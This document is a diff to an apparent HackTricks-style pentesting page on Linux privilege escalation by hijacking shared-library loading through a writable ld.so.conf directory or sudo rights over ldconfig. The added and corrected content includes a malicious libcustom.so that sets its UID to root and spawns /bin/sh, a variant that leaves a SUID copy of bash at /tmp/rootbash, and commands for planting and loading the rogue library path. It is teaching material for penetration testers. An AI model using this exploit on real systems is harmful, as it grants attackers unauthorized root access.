@@ -48,7 +48,7 @@ void vuln_func()
 
 1. **Create** those files in your machine in the same folder
 2. **Compile** the **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
-3. **Copy** `libcustom.so` to `/usr/lib`: `sudo cp libcustom.so /usr/lib` (root privs)
+3. **Copy** `libcustom.so` to `/usr/lib` and refresh the cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
 4. **Compile** the **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`
 
 ### Check the environment
@@ -67,35 +67,70 @@ Welcome to my amazing application!
 Hi
 ```
 
+### Useful triage commands
+
+When attacking a real target, verify the **exact library name** the binary needs and what the loader is **currently resolving**:
+
+```bash
+readelf -d ./sharedvuln | grep NEEDED
+ldconfig -p | grep libcustom
+/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
+  # x86_64; adjust for your arch
+LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
+```
+
+A couple of useful gotchas:
+
+- `sudo echo ... > /etc/ld.so.conf.d/x.conf` usually **doesn't work** because
+  the redirection is done by your current shell. Use
+  `echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` instead.
+- **SUID/privileged** binaries ignore `LD_LIBRARY_PATH`/`LD_PRELOAD` in
+  **secure-execution mode**, but directories coming from `/etc/ld.so.conf` are
+  still part of the trusted loader configuration, so this misconfiguration can
+  still affect privileged programs.
+- On newer glibc versions, the dynamic loader also exposes
+  `--list-diagnostics`, which is handy to debug cache resolution and
+  `glibc-hwcaps` subdirectory selection when a hijack doesn't behave as
+  expected.
+
 ## Exploit
 
 In this scenario we are going to suppose that **someone has created a vulnerable entry** inside a file in _/etc/ld.so.conf/_:
 
 ```bash
-sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
+echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
 ```
 
 The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access).\
 **Download and compile** the following code inside that path:
 
 ```c
-//gcc -shared -o libcustom.so -fPIC libcustom.c
+// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c
 
 #include <stdio.h>
+#include <stdlib.h>
 #include <unistd.h>
 #include <sys/types.h>
 
-void vuln_func(){
+void vuln_func(void){
     setuid(0);
     setgid(0);
-    printf("I'm the bad library\n");
-    system("/bin/sh",NULL,NULL);
+    puts("I'm the bad library");
+    system("/bin/sh");
 }
 ```
 
+If you expect **root** (or another privileged account) to execute the vulnerable binary later, it is usually better to leave a **root-owned artifact** instead of spawning an interactive shell. For example:
+
+```c
+system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
+```
+
+Then, after the privileged execution happens, you can use `/tmp/rootbash -p`.
+
 Now that we have **created the malicious libcustom library inside the misconfigured** path, we need to wait for a **reboot** or for the root user to execute **`ldconfig`** (_in case you can execute this binary as **sudo** or it has the **suid bit** you will be able to execute it yourself_).
 
-Once this has happened **recheck** where is the `sharevuln` executable loading the `libcustom.so` library from:
+Once this has happened **recheck** where the `sharedvuln` executable is loading the `libcustom.so` library from:
 
 ```c
 $ldd sharedvuln
@@ -131,6 +166,7 @@ So, lets create the files and folders needed to load "/tmp":
 
 ```bash
 cd /tmp
+mkdir -p conf
 echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
@@ -139,7 +175,7 @@ Now, as indicated in the **previous exploit**, **create the malicious library in
 And finally, lets load the path and check where is the binary loading the library from:
 
 ```bash
-ldconfig -f fake.ld.so.conf
+sudo ldconfig -f fake.ld.so.conf
 
 ldd sharedvuln
 	linux-vdso.so.1 =>  (0x00007fffa2dde000)
@@ -150,7 +186,10 @@ ldd sharedvuln
 
 **As you can see, having sudo privileges over `ldconfig` you can exploit the same vulnerability.**
 
+
+
+## References
+
+- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
+- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
 {{#include ../../banners/hacktricks-training.md}}
-
-
-
